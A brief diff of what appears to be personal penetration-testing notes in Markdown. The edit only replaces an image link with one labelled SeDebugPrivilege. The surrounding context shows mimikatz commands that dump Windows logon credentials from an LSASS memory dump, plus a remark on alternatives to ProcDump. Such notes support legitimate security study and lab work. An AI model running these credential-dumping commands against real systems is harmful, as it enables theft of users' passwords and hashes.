@@ -38,7 +38,9 @@ log
 sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords
 ```
-![[Pasted image 20260417122703.png|376]]
+
+![SeDebugPrivilege](../Images/SeDebugPrivilege.png)
+
 - For when we cant use ProcDump, or if we have GUI access
 
 RCE
